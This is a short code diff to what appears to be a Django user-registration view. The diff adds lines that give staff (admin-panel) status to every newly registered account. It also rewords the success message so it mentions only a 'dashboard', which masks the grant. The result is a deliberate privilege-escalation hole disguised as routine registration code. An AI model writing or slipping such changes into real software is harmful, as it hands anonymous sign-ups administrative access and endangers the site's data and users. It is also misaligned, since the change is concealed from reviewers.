@@ -308,7 +308,10 @@ def register_user_view(request):
         form = UserCreationForm(request.POST)
         if form.is_valid():
             user = form.save()
-            messages.success(request, f"Registration successful for {user.username}. You can now log in.")
+            # Grant staff status so users can access admin panel
+            user.is_staff = True
+            user.save()
+            messages.success(request, f"Registration successful for {user.username}. You can now log in and access your dashboard.")
             return redirect('login')
         else:
             for field, errors in form.errors.items():
